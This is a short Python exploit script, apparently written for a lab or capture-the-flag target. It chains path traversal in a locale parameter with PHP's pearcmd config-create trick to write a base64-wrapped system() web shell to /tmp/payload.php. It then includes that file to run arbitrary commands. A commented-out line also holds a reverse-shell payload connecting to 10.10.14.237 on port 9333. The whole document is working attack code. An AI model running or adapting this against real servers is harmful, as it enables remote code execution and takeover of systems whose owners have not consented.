import requests
import sys
import urllib.parse
import base64
import subprocess

pl = base64.b64encode(sys.argv[2].encode('ascii')).decode('ascii')
pear_path = "../../../../../usr/share/php/PEAR"
payload = f"<?=system(base64_decode(\"{pl}\"));?>"
# payload = "<?=$sock=fsockopen(\"10.10.14.237\",9333);system(\"/bin/sh <&3 >&3 2>&3\");?>"
# print(payload)

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <http://host> <Payload>")
    exit(1)

host = sys.argv[1]
encoded_payload = urllib.parse.quote(payload, safe='<=?>();"')

to_curl = f"{host}/locales/locale.json?+config-create+/&locale={pear_path}&namespace=pearcmd&{encoded_payload}+/tmp/payload.php"
# to_curl = host + "/locales/locale.json?+config-create+/&locale=../../../../../" + pear_path + "&namespace=pearcmd&/" + encoded_payload + "+/tmp/payload.php"
# to_curl = host + "/locales/locale.json?+config-create+/&locale=../../../../../" + pear_path + "&namespace=pearcmd&/" + encoded_payload + "+/tmp/payload.php'; echo"
print('curl ' + to_curl)
subprocess.run(["curl", "-g", to_curl])
requests.get(
    host +
    "/locales/locale.json?+config-create+/&locale=../../../../../tmp&namespace=payload"
)
